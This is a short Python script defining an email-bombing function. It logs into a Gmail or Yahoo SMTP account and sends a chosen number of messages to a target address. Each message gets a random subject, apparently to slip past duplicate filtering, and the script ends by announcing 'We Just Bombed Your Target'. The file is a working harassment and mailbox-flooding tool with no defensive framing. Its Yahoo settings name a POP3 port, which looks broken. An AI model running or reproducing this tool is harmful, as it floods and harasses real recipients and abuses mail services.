# -*- coding: utf-8 -*-
"""
Created on Tue Jan 29 23:22:17 2019

@author: champion
"""


import os

import smtplib

#import getpass

import sys


def bomb_email(server,user,passwd,to,subject,body,total):
        
#    server = input ("Please input type of mail server ['gmail','yahoo']: ")
#    
#    user = input('Please Enter Your E-mail ID: ')
#    
#    passwd = getpass.getpass('Please Enter Your Password: ')
#    
#    
#    
#    
#    
#    to = input('\nEnter Sender E-mail ID: ')
#    
#    subject = input("\n Enter the Subject: ")
#    
#    body = input('\n Enter Your Message: ')
#    
#    total = int(input('\n Number Of Times you have to BOMB : '))
    
 
    
    
    if server == 'gmail':
    
        smtp_server = 'smtp.gmail.com'
    
        port = 587
    
    elif server == 'yahoo':
    
        smtp_server = 'smtp.mail.yahoo.com'
    
        port = 995
    
    else:
    
    
        sys.exit()
    
    try:
    
        server = smtplib.SMTP(smtp_server,port) 
    
        server.ehlo()
    
        if smtp_server == "smtp.gmail.com":
    
                server.starttls()
    
        server.login(user,passwd)
    
        for i in range(1, total+1):
    
            subject = os.urandom(9)
            msg ="From : " +str(user) + "\n Subject: "+str(subject)+ " \n"+str(body)
    
            server.sendmail(user,to,msg)
    
    
            print ("\rSending Emails... : %i" % i)
    
            sys.stdout.flush()
    
        server.quit()
    
        print ('\n Yay! We Just Bombed Your Target !!!')
    
    except KeyboardInterrupt:
    
        print ('[-] Canceled')
    
        sys.exit()
    
    except smtplib.SMTPAuthenticationError:
    
        print ('\n[!] The username or password you entered is incorrect.')
    
        sys.exit()